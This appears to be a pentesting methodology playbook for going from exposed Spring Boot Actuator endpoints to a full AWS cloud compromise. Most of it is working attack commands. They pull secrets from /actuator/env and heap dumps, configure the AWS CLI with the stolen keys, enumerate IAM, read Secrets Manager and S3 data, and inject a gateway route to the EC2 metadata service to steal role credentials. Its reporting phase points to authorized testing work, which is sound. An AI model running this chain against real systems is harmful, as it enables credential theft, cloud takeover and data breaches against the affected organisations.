# Scenario: Spring Boot Actuator to Cloud Compromise Workflow

## Objective
Exploit exposed Spring Boot Actuator endpoints to extract credentials from heap dumps, enumerate cloud permissions, and pivot to full cloud infrastructure compromise.

---

## Phase 1: Discovery

### Step 1: Identify Spring Boot application
Indicators:
- Whitelabel Error Page (Spring Boot default 404/500)
- `X-Application-Context` header
- `/error` endpoint returning JSON with `timestamp`, `status`, `error`

### Step 2: Scan for Actuator endpoints
```bash
# Common base paths
curl -s https://target.com/actuator/
curl -s https://target.com/management/
curl -s https://target.com/actuator/health

# Full endpoint scan
ffuf -w actuator-wordlist.txt -u https://target.com/FUZZ -mc 200
```

**Actuator wordlist:**
```
actuator
actuator/health
actuator/env
actuator/configprops
actuator/metrics
actuator/loggers
actuator/heapdump
actuator/threaddump
actuator/mappings
actuator/beans
actuator/conditions
actuator/gateway/routes
```

### Step 3: Assess exposure level

| Finding | Next step |
|---------|-----------|
| `/health` only | Low value — confirms Spring Boot |
| `/env` exposed | Read environment variables for secrets |
| `/heapdump` exposed | Download and analyze for in-memory secrets |
| `/mappings` exposed | Discover hidden API endpoints |
| `/gateway/routes` exposed | SSRF via route injection |
| `/loggers` writable (POST) | Escalate logging to capture sensitive data |

---

## Phase 2: Credential Extraction

### Step 4: Check /env for secrets
```bash
curl -s https://target.com/actuator/env | jq .
```

Look for:
- `spring.datasource.password` — DB credentials
- `aws.accessKeyId` / `aws.secretKey`
- `spring.mail.password` — SMTP credentials
- Any property with "key", "secret", "password", "token"

> Note: Values may be masked as `******`. Proceed to heap dump.

### Step 5: Download heap dump
```bash
curl -o heapdump.hprof https://target.com/actuator/heapdump
```

### Step 6: Analyze heap dump for credentials
```bash
# Quick string analysis
strings heapdump.hprof | grep -i "aws_access_key\|aws_secret"
strings heapdump.hprof | grep -i "password\|passwd\|secret\|token\|key"
strings heapdump.hprof | grep -i "jdbc\|mysql\|postgres\|mongo"
strings heapdump.hprof | grep -i "Bearer\|Authorization"
strings heapdump.hprof | grep -i "AKIA"     # AWS Access Key prefix

# For deeper analysis, use Eclipse MAT
# File → Open Heap Dump → OQL queries
# SELECT * FROM java.lang.String WHERE toString() LIKE '.*AKIA.*'
```

---

## Phase 3: AWS Cloud Exploitation

### Step 7: Configure AWS CLI
```bash
aws configure --profile actuator
# Enter extracted Access Key ID and Secret Access Key
# Region: check /actuator/env for aws.region or default to us-east-1
```

### Step 8: Validate access
```bash
aws sts get-caller-identity --profile actuator
```

### Step 9: Enumerate IAM permissions
```bash
# What user is this?
aws iam get-user --profile actuator

# What policies are attached?
aws iam list-attached-user-policies --user-name USERNAME --profile actuator
aws iam list-user-policies --user-name USERNAME --profile actuator

# Get policy details
aws iam get-user-policy --user-name USERNAME --policy-name POLICY --profile actuator

# What groups?
aws iam list-groups-for-user --user-name USERNAME --profile actuator
```

### Step 10: Exploit available permissions
```bash
# Read secrets
aws secretsmanager list-secrets --profile actuator
aws secretsmanager get-secret-value --secret-id SECRET_NAME --profile actuator

# List S3 buckets
aws s3 ls --profile actuator

# Read S3 data
aws s3 ls s3://bucket-name --recursive --profile actuator
aws s3 cp s3://bucket-name/sensitive-file.txt . --profile actuator

# List EC2 instances
aws ec2 describe-instances --profile actuator

# List Lambda functions
aws lambda list-functions --profile actuator
aws lambda get-function --function-name FUNC --profile actuator
```

---

## Phase 4: SSRF via Spring Cloud Gateway (if available)

### Step 11: Check for Gateway routes endpoint
```bash
curl -s https://target.com/actuator/gateway/routes
```

### Step 12: Inject route to cloud metadata
```bash
curl -X POST "https://target.com/actuator/gateway/routes/metadata" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "metadata",
    "uri": "http://169.254.169.254",
    "predicates": [{"name": "Path", "args": {"pattern": "/latest/**"}}]
  }'
```

### Step 13: Refresh and access metadata
```bash
curl -X POST "https://target.com/actuator/gateway/refresh"

# Access EC2 metadata
curl https://target.com/latest/meta-data/
curl https://target.com/latest/meta-data/iam/security-credentials/
curl https://target.com/latest/meta-data/iam/security-credentials/ROLE_NAME
```

IAM role credentials from metadata provide **temporary access** (valid 1-6 hours) with whatever permissions the role has — often more than the leaked user credentials.

---

## Phase 5: Post-Exploitation and Reporting

### Step 14: Assess total impact
- What databases can be accessed?
- What secrets were stored in Secrets Manager?
- What data exists in S3 buckets?
- What EC2 instances are running? Can you SSH to them?
- Can you escalate IAM permissions?

### Step 15: Document the full chain
```
Exposed /actuator/heapdump
  → Downloaded JVM memory snapshot
    → Extracted AWS Access Key (AKIA...)
      → Configured AWS CLI
        → Enumerated IAM → found secretsmanager access
          → Retrieved production database credentials
            → Full data breach potential
```

## Tools
- `curl` / `httpie` — HTTP requests
- `strings` + `grep` — Quick heap dump analysis
- `Eclipse MAT` — Deep heap dump analysis
- `aws` CLI — AWS enumeration and exploitation
- `Pacu` — AWS exploitation framework
- `ffuf` — Endpoint discovery

## References
- `techniques/spring-boot-actuator-exploitation.md`
- `case-studies/case-study-spring-boot-actuator-volkswagen.md`
- `methodology/privilege-escalation-checklist.md`
